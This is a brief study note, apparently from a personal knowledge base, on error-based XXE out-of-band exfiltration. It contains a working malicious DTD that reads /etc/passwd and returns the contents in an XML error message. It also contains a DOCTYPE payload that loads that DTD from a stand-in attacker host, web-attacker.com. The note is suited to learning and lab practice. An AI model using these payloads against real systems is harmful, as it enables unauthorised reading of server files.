---
tags:
  - web
  - security
---
An attack using [[XXE Out of Bound Data Exfiltration]] that triggers error messages to be returned to the client.
# Process
Setup a malicious [[Document Type Definition|DTD]] on your exploit server.
- `Content-Type: application/xml-dtd`
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
- Creates an entity file that has contents of `/etc/passwd`
- Evals another XML error, error is evaluated with a non-existent diretory but the `%file` is passed as a parameter
- Error message should be returned with the contents of the file
To the vulnerable website:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
![[XXE Error Message Exfiltration-20261122200737247.webp]]